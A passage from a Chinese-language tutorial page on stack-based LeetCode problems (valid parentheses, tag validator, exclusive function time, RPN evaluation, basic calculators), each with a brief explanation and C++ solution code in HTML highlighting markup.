class="hljs-string">&#x27;a&#x27;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>                        vis[st.<span class="hljs-built_in">back</span>() - <span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-number">0</span>;<br>                        st.<span class="hljs-built_in">pop_back</span>();<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                vis[ch - <span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-number">1</span>;<br>                st.<span class="hljs-built_in">push_back</span>(ch);<br>            &#125;<br>            num[ch - <span class="hljs-string">&#x27;a&#x27;</span>]--;<br>        &#125;<br>        <span class="hljs-keyword">return</span> st;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="删除字符串中的所有相邻重复项-ii">删除字符串中的所有相邻重复项II</h2><blockquote><p>初始长度为 n 的数组counts。遍历字符串：如果当前字符与上一个字符相等，令 counts[i] =counts[i - 1] + 1。否则，令 counts[i] = 1。如果 counts[i] = k，删除这 k个字符，令 i = i - k。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">removeDuplicates</span><span class="hljs-params">(string s, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        stack&lt;<span class="hljs-type">int</span>&gt; counts;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> || s[i] != s[i - <span class="hljs-number">1</span>]) &#123;<br>                counts.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (++counts.<span class="hljs-built_in">top</span>() == k) &#123;<br>                counts.<span class="hljs-built_in">pop</span>();<br>                s.<span class="hljs-built_in">erase</span>(i - k + <span class="hljs-number">1</span>, k);<br>                i = i - k;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="栈与括号匹配">5. 栈与括号匹配</h1><h2 id="有效的括号">有效的括号</h2><blockquote><p>如果是左括号，则入栈；否则通过哈希表判断括号对应关系，若 stack栈顶出栈括号与当前遍历括号不对应，则提前返回 false。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValid</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">size</span>();<br>        unordered_map&lt;<span class="hljs-type">char</span>, <span class="hljs-type">char</span>&gt; pairs = &#123;&#123;<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>&#125;&#125;;<br>        stack&lt;<span class="hljs-type">char</span>&gt; st;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : s) &#123;<br>            <span class="hljs-keyword">if</span> (pairs.<span class="hljs-built_in">count</span>(ch)) &#123;<br>                <span class="hljs-keyword">if</span> (st.<span class="hljs-built_in">empty</span>() || st.<span class="hljs-built_in">top</span>() != pairs[ch]) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>                st.<span class="hljs-built_in">pop</span>();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                st.<span class="hljs-built_in">push</span>(ch);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> st.<span class="hljs-built_in">empty</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="函数的独占时间">函数的独占时间</h2><blockquote><p>由于每一个函数都有一个对应的 start 和 end 日志，且当遇到一个 end日志时，栈顶元素一定为其对应的 start日志。我们可以用栈来模拟函数调用的过程，栈顶的元素为当前正在执行函数：</p><ul><li><p>当函数调用开始时，如果当前有函数正在运行，则当前正在运行函数应当停止，此时计算其的执行时间，然后将调用函数入栈。</p></li><li><p>当函数调用结束时，将栈顶元素弹出，并计算相应的执行时间，如果此时栈顶有被暂停的函数，则开始运行该函数。</p></li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">exclusiveTime</span><span class="hljs-params">(<span class="hljs-type">int</span> n, vector&lt;string&gt;&amp; logs)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">res</span><span class="hljs-params">(n,<span class="hljs-number">0</span>)</span></span>;<br>        stack&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; st;<br>        <span class="hljs-keyword">for</span> (string log : logs) &#123;<br>            <span class="hljs-type">char</span> type[<span class="hljs-number">10</span>];<br>            <span class="hljs-type">int</span> idx, timestamp;<br>            <span class="hljs-built_in">sscanf</span>(log.<span class="hljs-built_in">c_str</span>(), <span class="hljs-string">&quot;%d:%[^:]:%d&quot;</span>, &amp;idx, type, &amp;timestamp);<br>            <span class="hljs-keyword">if</span> (type[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;s&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!st.<span class="hljs-built_in">empty</span>()) &#123;<br>                    res[st.<span class="hljs-built_in">top</span>().first] += timestamp - st.<span class="hljs-built_in">top</span>().second;<br>                &#125;<br>                st.<span class="hljs-built_in">emplace</span>(idx, timestamp);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">auto</span> temp = st.<span class="hljs-built_in">top</span>();<br>                st.<span class="hljs-built_in">pop</span>();<br>                res[temp.first] += timestamp - temp.second + <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span> (!st.<span class="hljs-built_in">empty</span>()) &#123;<br>                    st.<span class="hljs-built_in">top</span>().second = timestamp + <span class="hljs-number">1</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="标签验证器">标签验证器</h2><blockquote><p>由于标签具有「最先开始的标签最后结束」的特性，可以考虑使用一个栈存储当前开放的标签。除此之外，还需要考虑cdata 以及一般的字符，二者都可以使用遍历 + 判断的方法直接进行验证。</p><ul><li>如果当前的字符为 &lt;，那么需要考虑下面的四种情况：<ul><li>如果下一个字符为/，那么说明我们遇到了一个结束标签。我们需要定位下一个 &gt; 的位置j，此时 code[i+2..j−1]就是该结束标签的名称。我们需要判断该名称与当前栈顶的名称是否匹配，如果匹配，说明名称的标签已经闭合，我们需要将当前栈顶的名称弹出。同时根据规则1，我们需要保证整个 code 被闭合标签包围，因此如果栈中已经没有标签，但是j 并不是 code的末尾，那么说明后续还会有字符，它们不被闭合标签包围。</li><li>如果下一个字符为 !，那么说明我们遇到了一个 cdata，我们需要继续往后读7 个字符，判断其是否为 [CDATA[。在这之后，我们定位下一个 ]]&gt; 的位置j，此时 code[i+9..j−1] 就是 cdata中的内容，它不需要被解析，所以我们也不必进行任何验证。需要注意的是，根据规则1，栈中需要存在至少一个开放的标签。</li><li>如果下一个字符为大写字母，那么说明我们遇到了一个开始标签。我们需要定位下一个&gt; 的位置 j，此时 code[i+2..j−1]就是该开始标签的名称。我们需要判断该名称是否恰好由 1 至 9个大写字母组成，如果是，说明该标签合法，我们需要将该名称放入栈顶。</li><li>除此之外，如果不存在下一个字符，或者下一个字符不属于上述三种情况，那么code 是不合法的。</li></ul></li><li>如果当前的字符为其它字符，那么根据规则1，栈中需要存在至少一个开放的标签。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValid</span><span class="hljs-params">(string code)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = code.<span class="hljs-built_in">size</span>();<br>        stack&lt;string&gt; tags;<br><br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i &lt; n) &#123;<br>            <span class="hljs-keyword">if</span> (code[i] == <span class="hljs-string">&#x27;&lt;&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (i == n - <span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (code[i + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;/&#x27;</span>) &#123;<br>                    <span class="hljs-type">int</span> j = code.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>, i);<br>                    <span class="hljs-keyword">if</span> (j == string::npos) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    string tagname = code.<span class="hljs-built_in">substr</span>(i + <span class="hljs-number">2</span>, j - (i + <span class="hljs-number">2</span>));<br>                    <span class="hljs-keyword">if</span> (tags.<span class="hljs-built_in">empty</span>() || tags.<span class="hljs-built_in">top</span>() != tagname) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    tags.<span class="hljs-built_in">pop</span>();<br>                    i = j + <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">if</span> (tags.<span class="hljs-built_in">empty</span>() &amp;&amp; i != n) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code[i + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;!&#x27;</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (tags.<span class="hljs-built_in">empty</span>()) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    string cdata = code.<span class="hljs-built_in">substr</span>(i + <span class="hljs-number">2</span>, <span class="hljs-number">7</span>);<br>                    <span class="hljs-keyword">if</span> (cdata != <span class="hljs-string">&quot;[CDATA[&quot;</span>) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    <span class="hljs-type">int</span> j = code.<span class="hljs-built_in">find</span>(<span class="hljs-string">&quot;]]&gt;&quot;</span>, i);<br>                    <span class="hljs-keyword">if</span> (j == string::npos) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    i = j + <span class="hljs-number">3</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-type">int</span> j = code.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>, i);<br>                    <span class="hljs-keyword">if</span> (j == string::npos) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    string tagname = code.<span class="hljs-built_in">substr</span>(i + <span class="hljs-number">1</span>, j - (i + <span class="hljs-number">1</span>));<br>                    <span class="hljs-keyword">if</span> (tagname.<span class="hljs-built_in">size</span>() &lt; <span class="hljs-number">1</span> || tagname.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">9</span>) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">all_of</span>(tagname.<span class="hljs-built_in">begin</span>(), tagname.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> c) &#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">isupper</span>(c); &#125;)) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    tags.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">move</span>(tagname));<br>                    i = j + <span class="hljs-number">1</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (tags.<span class="hljs-built_in">empty</span>()) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>                ++i;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> tags.<span class="hljs-built_in">empty</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最长有效括号">最长有效括号</h2><blockquote><p>始终保持栈底元素为当前已经遍历过的元素中「最后一个没有被匹配的右括号的下标」</p><ul><li>对于遇到的每个 ‘(’，我们将它的下标放入栈中</li><li>对于遇到的每个 ‘)’，我们先弹出栈顶元素表示匹配了当前右括号：<ul><li>如果栈为空，说明当前的右括号为没有被匹配的右括号，我们将其下标放入栈中来更新我们之前提到的「最后一个没有被匹配的右括号的下标」</li><li>如果栈不为空，当前右括号的下标减去栈顶元素即为「以该右括号为结尾的最长有效括号的长度」</li></ul></li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">longestValidParentheses</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        stack&lt;<span class="hljs-type">int</span>&gt; st;<br>        st.<span class="hljs-built_in">push</span>(<span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">length</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27;(&#x27;</span>) &#123;<br>                st.<span class="hljs-built_in">push</span>(i);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                st.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span> (st.<span class="hljs-built_in">empty</span>()) &#123;<br>                    st.<span class="hljs-built_in">push</span>(i);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    ans = <span class="hljs-built_in">max</span>(ans, i - st.<span class="hljs-built_in">top</span>());<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="表达式求值">6. 表达式求值</h1><h2 id="逆波兰表达式求值">逆波兰表达式求值</h2><blockquote><p>逆波兰表达式严格遵循「从左到右」的运算。计算逆波兰表达式的值时，使用一个栈存储操作数，从左到右遍历逆波兰表达式，进行如下操作：</p><ul><li>如果遇到操作数，则将操作数入栈；</li><li>如果遇到运算符，则将两个操作数出栈，其中先出栈的是右操作数，后出栈的是左操作数，使用运算符对两个操作数进行运算，将运算得到的新操作数入栈。</li></ul><p>整个逆波兰表达式遍历完毕之后，栈内只有一个元素，该元素即为逆波兰表达式的值。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">evalRPN</span><span class="hljs-params">(vector&lt;string&gt;&amp; tokens)</span> </span>&#123;<br>        stack&lt;<span class="hljs-type">int</span>&gt; st;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; tokens.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            string token = tokens[i];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNumber</span>(token)) &#123;<br>                st.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">atoi</span>(token.<span class="hljs-built_in">c_str</span>()));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">int</span> num2 = st.<span class="hljs-built_in">top</span>();<br>                st.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-type">int</span> num1 = st.<span class="hljs-built_in">top</span>();<br>                st.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">switch</span> (token[<span class="hljs-number">0</span>]) &#123;<br>                    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>                        st.<span class="hljs-built_in">push</span>(num1 + num2);<br>                        <span class="hljs-keyword">break</span>;<br>                    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:<br>                        st.<span class="hljs-built_in">push</span>(num1 - num2);<br>                        <span class="hljs-keyword">break</span>;<br>                    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;*&#x27;</span>:<br>                        st.<span class="hljs-built_in">push</span>(num1 * num2);<br>                        <span class="hljs-keyword">break</span>;<br>                    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/&#x27;</span>:<br>                        st.<span class="hljs-built_in">push</span>(num1 / num2);<br>                        <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> st.<span class="hljs-built_in">top</span>();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isNumber</span><span class="hljs-params">(string&amp; token)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> !(token == <span class="hljs-string">&quot;+&quot;</span> || token == <span class="hljs-string">&quot;-&quot;</span> || token == <span class="hljs-string">&quot;*&quot;</span> || token == <span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="基本计算器">基本计算器</h2><blockquote><p>由于字符串除了数字与括号外，只有加号和减号两种运算符。因此，如果展开表达式中所有的括号，则得到的新表达式中，数字本身不会发生变化，只是每个数字前面的符号会发生变化。使用一个取值为{−1,+1} 的整数 sign代表「当前」的符号。根据括号表达式的性质，它的取值：</p><ul><li>与字符串中当前位置的运算符有关；</li><li>如果当前位置处于一系列括号之内，则也与这些括号前面的运算符有关：每当遇到一个以<code>−</code>号开头的括号，则意味着此后的符号都要被「翻转」。（维护一个栈<em>ops</em>，其中栈顶元素记录了当前位置所处的每个括号所「共同形成」的符号。）</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">calculate</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br><br>        stack&lt;<span class="hljs-type">int</span>&gt; ops;<br>        ops.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">int</span> sign = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i &lt; n) &#123;<br>            <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>                i++;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27;+&#x27;</span>) &#123;<br>                sign = ops.<span class="hljs-built_in">top</span>();<br>                i++;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27;-&#x27;</span>) &#123;<br>                sign = -ops.<span class="hljs-built_in">top</span>();<br>                i++;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27;(&#x27;</span>) &#123;<br>                ops.<span class="hljs-built_in">push</span>(sign);<br>                i++;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>                ops.<span class="hljs-built_in">pop</span>();<br>                i++;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">long</span> num = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">while</span> (i &lt; n &amp;&amp; s[i] &gt;= <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; s[i] &lt;= <span class="hljs-string">&#x27;9&#x27;</span>) &#123;<br>                    num = num * <span class="hljs-number">10</span> + s[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>                    i++;<br>                &#125;<br>                res += sign * num;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="基本计算器-ii">基本计算器 II</h2><blockquote><p>遍历字符串 <em>s</em>，并用变量 <em>preSign</em>记录每个数字之前的运算符，对于第一个数字，其之前的运算符视为加号。若读到一个运算符，或者遍历到字符串末尾，即认为是遍历到了数字末尾。处理完该数字后，更新<em>preSign</em> 为当前遍历的字符。</p><ol type="1"><li>将减法转化为加法（取相反数）</li><li>由于乘除法优先级高，直接计算</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">calculate</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; st;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">char</span> preSign = <span class="hljs-string">&#x27;+&#x27;</span>;<br>        <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isdigit</span>(s[i])) &#123;<br>                num = num * <span class="hljs-number">10</span> + <span class="hljs-built_in">int</span>(s[i] - <span class="hljs-string">&#x27;0&#x27;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isdigit</span>(s[i]) &amp;&amp; s[i] != <span class="hljs-string">&#x27; &#x27;</span> || i == n - <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">switch</span> (preSign) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>                    st.<span class="hljs-built_in">push_back</span>(num);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:<br>                    st.<span class="hljs-built_in">push_back</span>(-num);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;*&#x27;</span>:<br>                    st.<span class="hljs-built_in">back</span>() *= num;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/&#x27;</span>:<br>                    st.<span 